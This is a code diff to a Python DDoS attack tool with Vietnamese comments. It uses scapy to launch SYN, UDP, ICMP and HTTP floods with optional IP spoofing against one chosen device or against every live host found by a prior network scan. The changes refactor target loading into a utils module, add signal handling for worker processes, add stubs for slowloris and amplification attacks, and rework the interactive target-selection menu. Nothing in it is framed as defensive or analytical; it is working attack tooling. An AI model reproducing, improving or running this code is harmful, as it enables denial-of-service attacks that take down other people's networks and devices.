@@ -14,9 +14,11 @@ import queue
 import logging
 import json
 import os
+import signal
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from scapy.all import Ether, IP, TCP, ARP, srp, sendp, UDP, ICMP
 from typing import List, Dict, Optional, Tuple
+from . import utils  # Import module utils
 import ipaddress
 
 # --- Worker Process Function (for multiprocessing) ---
@@ -71,6 +73,15 @@ def _create_packet_for_worker(attack_type: str, target_ip: str, target_mac: str,
                     IP(src=src_ip, dst=target_ip) / 
                     TCP(sport=src_port, dport=port, flags="PA") / 
                     http_payload.encode())
+
+    # --- Thêm placeholder cho các loại tấn công chưa được triển khai ---
+    elif attack_type == 'slowloris':
+        # Logic cho Slowloris sẽ khác, cần tạo socket và giữ kết nối
+        # Đây chỉ là placeholder, cần triển khai logic riêng
+        raise NotImplementedError("Slowloris attack is not implemented in the worker process yet.")
+    elif attack_type == 'amplification':
+        raise NotImplementedError("Amplification attack is not implemented in the worker process yet.")
+    # --------------------------------------------------------------------
     
     # Fallback for other types
     return bytes(Ether(dst=target_mac) / IP(src=src_ip, dst=target_ip) / ICMP())
@@ -157,7 +168,7 @@ class DDoSAttacker:
         :param port: Cổng đích
         :param attack_type: Loại tấn công ('syn_flood', 'udp_flood', 'icmp_flood', 'mixed', 'http_flood', 'slowloris')
         :param spoof_ip: Có giả mạo IP không
-        :param threads_per_target: Số luồng cho mỗi mục tiêu (mặc định: 10)
+        :param threads_per_target: Số tiến trình (worker) cho mỗi mục tiêu (mặc định: 10)
         :param packet_rate: Tốc độ gửi gói tin (packets/second, mặc định: 5000)
         :param duration: Thời gian tấn công (giây), None = vô hạn
         :param debug: Bật debug logging
@@ -184,7 +195,7 @@ class DDoSAttacker:
         
         # Cơ chế điều khiển
         self.manager = multiprocessing.Manager()
-        self.stop_event = self.manager.Event()
+        self.stop_event = multiprocessing.Event() # Sử dụng Event của multiprocessing, không phải của Manager
         self.resolved_targets: Dict[str, str] = {}
         self.processes: List[multiprocessing.Process] = []
         
@@ -200,95 +211,8 @@ class DDoSAttacker:
         # Queue để các worker gửi lại thống kê
         self.stats_queue = self.manager.Queue()
         
-        # Logging
-        self._setup_logging()
-    
-    def _setup_logging(self):
-        """Thiết lập logging cho monitoring."""
-        log_level = logging.DEBUG if self.debug else logging.INFO
-        
-        logging.basicConfig(
-            level=log_level,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler('ddos_attack.log'),
-                logging.StreamHandler()
-            ]
-        )
+        # Lấy logger đã được cấu hình sẵn từ root
         self.logger = logging.getLogger(__name__)
-    
-    def _load_device_database(self) -> Dict:
-        """Tải cơ sở dữ liệu thiết bị từ file YAML hoặc JSON."""
-        devices = {}
-        try:
-            yaml_file = 'devices.yaml'
-            if os.path.exists(yaml_file):
-                import yaml
-                with open(yaml_file, 'r', encoding='utf-8') as f:
-                    data = yaml.safe_load(f)
-                    if data and 'devices' in data:
-                        return data.get('devices', {})
-                    return data if isinstance(data, dict) else {}
-            
-            json_file = 'devices.txt'
-            if os.path.exists(json_file):
-                with open(json_file, 'r') as f:
-                    return json.load(f)
-        except Exception as e:
-            self.logger.warning(f"Không thể tải DB thiết bị, sẽ dựa vào ARP requests: {e}")
-        return devices
-
-    def load_targets_from_scan(self, exclude_router: bool = True, exclude_attacker: bool = True) -> List[str]:
-        """
-        Tải danh sách mục tiêu từ kết quả quét mạng.
-        
-        :param exclude_router: Loại trừ IP router (thường là .1)
-        :param exclude_attacker: Loại trừ IP của attacker
-        :return: Danh sách IP mục tiêu
-        """
-        targets = []
-        
-        try:
-            # Thử đọc file YAML trước
-            yaml_file = 'devices.yaml'
-            if os.path.exists(yaml_file):
-                import yaml
-                with open(yaml_file, 'r', encoding='utf-8') as f:
-                    data = yaml.safe_load(f)
-                    if data and 'devices' in data:
-                        devices = data['devices']
-                    else:
-                        devices = data  # Fallback nếu không có cấu trúc metadata
-            else:
-                # Fallback về JSON
-                json_file = 'devices.txt'
-                if os.path.exists(json_file):
-                    with open(json_file, 'r') as f:
-                        devices = json.load(f)
-                else:
-                    self.logger.warning("Không tìm thấy file devices.yaml hoặc devices.txt. Vui lòng quét mạng trước.")
-                    return targets
-            
-            for ip, info in devices.items():
-                if info.get('status') == 'up':
-                    # Loại trừ router (thường là .1)
-                    if exclude_router and ip.endswith('.1'):
-                        self.logger.info(f"Loại trừ router: {ip}")
-                        continue
-                        
-                    # Loại trừ attacker
-                    if exclude_attacker and ip == self.attacker_ip:
-                        self.logger.info(f"Loại trừ attacker: {ip}")
-                        continue
-                        
-                    targets.append(ip)
-                    
-            self.logger.info(f"Đã tải {len(targets)} mục tiêu từ devices.yaml")
-                
-        except Exception as e:
-            self.logger.error(f"Lỗi khi tải targets: {e}")
-            
-        return targets
     
     def select_single_target(self, available_targets: List[str]) -> Optional[str]:
         """
@@ -305,26 +229,7 @@ class DDoSAttacker:
         print("0. Tấn công tất cả thiết bị")
         
         # Tải thông tin thiết bị để hiển thị
-        devices_info = {}
-        try:
-            # Thử đọc YAML trước
-            yaml_file = 'devices.yaml'
-            if os.path.exists(yaml_file):
-                import yaml
-                with open(yaml_file, 'r', encoding='utf-8') as f:
-                    data = yaml.safe_load(f)
-                    if data and 'devices' in data:
-                        devices_info = data['devices']
-                    else:
-                        devices_info = data
-            else:
-                # Fallback về JSON
-                json_file = 'devices.txt'
-                if os.path.exists(json_file):
-                    with open(json_file, 'r') as f:
-                        devices_info = json.load(f)
-        except:
-            pass
+        devices_info = utils.load_device_database(self.logger)
             
         for i, ip in enumerate(available_targets, 1):
             device_info = devices_info.get(ip, {})
@@ -415,7 +320,7 @@ class DDoSAttacker:
             self.logger.warning("Không có mục tiêu nào để phân giải MAC.")
             return False
             
-        device_db = self._load_device_database()
+        device_db = utils.load_device_database(self.logger)
             
         try:
             # Sử dụng ThreadPoolExecutor để phân giải song song
@@ -528,6 +433,12 @@ class DDoSAttacker:
         self.stop_event.clear()
         self.stats['start_time'] = time.time()
         
+        # --- Xử lý tín hiệu để tắt an toàn ---
+        # Thiết lập để các tiến trình con bỏ qua tín hiệu SIGINT (Ctrl+C).
+        # Chỉ tiến trình chính sẽ xử lý nó một cách an toàn.
+        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
+        # ------------------------------------
+
         # Khởi động monitoring process
         monitor_process = multiprocessing.Process(target=self._monitor_attack, daemon=True)
         monitor_process.start()
@@ -552,6 +463,12 @@ class DDoSAttacker:
                 self.processes.append(process)
                 process.start()
                 
+        # --- Khôi phục xử lý tín hiệu cho tiến trình chính ---
+        # Điều này cho phép Ctrl+C hoạt động bình thường trong vòng lặp chờ,
+        # trong khi các tiến trình con vẫn bỏ qua nó.
+        signal.signal(signal.SIGINT, original_sigint_handler)
+        # -------------------------------------------------
+
         self.logger.info(f"Tấn công đã bắt đầu với {len(self.processes) - 1} tiến trình worker. Nhấn Ctrl+C để dừng.")
         return True
     
@@ -562,10 +479,15 @@ class DDoSAttacker:
         
         # Đợi các tiến trình con kết thúc
         for process in self.processes:
-            process.join(timeout=2)
+            self.logger.info(f"Đang chờ tiến trình {process.name} (PID: {process.pid}) dừng...")
+            process.join(timeout=2) # Cho 2 giây để tự dừng
             if process.is_alive():
+                self.logger.warning(f"Tiến trình {process.name} không tự dừng, đang buộc dừng (terminate)...")
                 process.terminate() # Buộc dừng nếu không tự thoát
-            
+                process.join() # Đợi sau khi terminate
+            else:
+                self.logger.info(f"Tiến trình {process.name} đã dừng thành công.")
+
         self.processes.clear()
         
         # Hiển thị thống kê cuối cùng
@@ -598,17 +520,39 @@ def run_ddos_attack(attacker_ip: str, interface: str, **kwargs):
     :param interface: Interface mạng
     :param kwargs: Các tham số khác cho DDoSAttacker
     """
-    print("\n=== DDoS ATTACK MODULE ===")
-    print("1. Tấn công đồng loạt nhiều thiết bị")
-    print("2. Tấn công 1 thiết bị cụ thể")
-    
     # Kiểm tra quyền root
     import os
     if os.geteuid() != 0:
         print("[-] CẢNH BÁO: Cần quyền root để thực hiện tấn công DDoS.")
         print("[-] Vui lòng chạy lại với sudo.")
         return
-    
+
+    try:
+        # --- BƯỚC 1: CHỌN PHƯƠNG THỨC TẤN CÔNG (SINGLE/MULTIPLE) ---
+        print("\n=== DDoS ATTACK MODULE ===")
+        print("1. Tấn công đồng loạt nhiều thiết bị")
+        print("2. Tấn công 1 thiết bị cụ thể")
+        
+        method_choice = None
+        while True:
+            try:
+                choice_str = input("\nChọn phương thức tấn công (1-2): ")
+                method_choice = int(choice_str)
+                if method_choice in [1, 2]:
+                    break
+                else:
+                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
+            except ValueError:
+                print("Vui lòng nhập số.")
+    except KeyboardInterrupt:
+        print("\n[*] Hủy tấn công.")
+        return
+    except Exception as e:
+        logging.error(f"Lỗi không mong muốn trong DDoS: {e}")
+        return
+        
+    # --- BƯỚC 2: CHỌN LOẠI TẤN CÔNG (SYN, UDP, etc.) ---
+
     # Tách các tham số đặc biệt
     debug = kwargs.pop('debug', False)
     skip_ping = kwargs.pop('skip_ping_check', False)
@@ -729,85 +673,55 @@ def run_ddos_attack(attacker_ip: str, interface: str, **kwargs):
         except KeyboardInterrupt:
             return
     
-    while True:
+    # --- BƯỚC 5: KHỞI TẠO VÀ CHẠY TẤN CÔNG ---
+    kwargs.pop('port', None) # Loại bỏ port khỏi kwargs để tránh conflict
+    attacker = DDoSAttacker(attacker_ip, interface, 
+                           attack_type=selected_attack,
+                           port=selected_port,
+                           debug=debug, skip_ping_check=skip_ping, 
+                           aggressive=aggressive, **kwargs)
+
+    if method_choice == 1:
+        # Tấn công đồng loạt
+        print("\n[*] Tấn công đồng loạt nhiều thiết bị...")
+        targets = utils.load_targets_from_scan(attacker.logger, attacker.attacker_ip, exclude_router=True, exclude_attacker=True)
+        if not targets:
+            print("[-] Không có mục tiêu nào để tấn công.")
+            print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
+            return
+        attacker.set_targets(targets)
+        print(f"[+] Sẽ tấn công {len(targets)} thiết bị với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
+    
+    elif method_choice == 2:
+        # Tấn công 1 thiết bị
+        print("\n[*] Tấn công 1 thiết bị cụ thể...")
+        available_targets = utils.load_targets_from_scan(attacker.logger, attacker.attacker_ip, exclude_router=True, exclude_attacker=True)
+        if not available_targets:
+            print("[-] Không có mục tiêu nào để chọn.")
+            print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
+            return
+        selected_target = attacker.select_single_target(available_targets)
+        if selected_target is None:
+            print("[-] Không chọn mục tiêu nào. Hủy tấn công.")
+            return
+        attacker.set_targets([selected_target])
+        print(f"[+] Sẽ tấn công thiết bị: {selected_target} với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
+
+    # Bắt đầu tấn công
+    if attacker.start_attack():
         try:
-            choice = input("\nChọn phương thức tấn công (1-2): ")
-            choice = int(choice)
-            
-            if choice == 1:
-                # Tấn công đồng loạt
-                print("\n[*] Tấn công đồng loạt nhiều thiết bị...")
-                # Loại bỏ port khỏi kwargs để tránh conflict
-                kwargs.pop('port', None)
-                attacker = DDoSAttacker(attacker_ip, interface, 
-                                       attack_type=selected_attack,
-                                       port=selected_port,
-                                       debug=debug, skip_ping_check=skip_ping, 
-                                       aggressive=aggressive, **kwargs)
-                
-                # Tải targets từ scan
-                targets = attacker.load_targets_from_scan(exclude_router=True, exclude_attacker=True)
-                if not targets:
-                    print("[-] Không có mục tiêu nào để tấn công.")
-                    print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
-                    return
-                    
-                attacker.set_targets(targets)
-                print(f"[+] Sẽ tấn công {len(targets)} thiết bị với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
-                
-            elif choice == 2:
-                # Tấn công 1 thiết bị
-                print("\n[*] Tấn công 1 thiết bị cụ thể...")
-                # Loại bỏ port khỏi kwargs để tránh conflict
-                kwargs.pop('port', None)
-                attacker = DDoSAttacker(attacker_ip, interface, 
-                                       attack_type=selected_attack,
-                                       port=selected_port,
-                                       debug=debug, skip_ping_check=skip_ping, 
-                                       aggressive=aggressive, **kwargs)
-                
-                # Tải danh sách targets để chọn
-                available_targets = attacker.load_targets_from_scan(exclude_router=True, exclude_attacker=True)
-                if not available_targets:
-                    print("[-] Không có mục tiêu nào để chọn.")
-                    print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
-                    return
-                    
-                # Chọn target cụ thể
-                selected_target = attacker.select_single_target(available_targets)
-                if selected_target is None:
-                    print("[-] Không chọn mục tiêu nào.")
-                    return
-                    
-                attacker.set_targets([selected_target])
-                print(f"[+] Sẽ tấn công thiết bị: {selected_target} với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
-                
-            else:
-                print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
-                continue
-                
-            # Bắt đầu tấn công
-            if attacker.start_attack():
-                try:
-                    while attacker.is_attacking():
-                        time.sleep(1)
-                except KeyboardInterrupt:
-                    print("\n[*] Người dùng yêu cầu dừng...")
-                    attacker.stop_attack()
-            else:
-                print("[-] Không thể bắt đầu tấn công.")
-                print("[-] Kiểm tra lại:")
-                print("   1. Quyền root (sudo)")
-                print("   2. Interface mạng đúng")
-                print("   3. Thiết bị mục tiêu online")
-                    
-            break
-            
-        except ValueError:
-            print("Vui lòng nhập số.")
+            while attacker.is_attacking():
+                time.sleep(1)
         except KeyboardInterrupt:
-            print("\n[*] Hủy tấn công.")
-            break
+            print("\n[*] Người dùng yêu cầu dừng...")
+            attacker.stop_attack()
+    else:
+        print("[-] Không thể bắt đầu tấn công.")
+        print("[-] Kiểm tra lại:")
+        print("   1. Quyền root (sudo)")
+        print("   2. Interface mạng đúng")
+        print("   3. Thiết bị mục tiêu online")
+
 
 if __name__ == '__main__':
     # Cần thiết cho multiprocessing trên một số hệ điều hành (Windows, macOS)
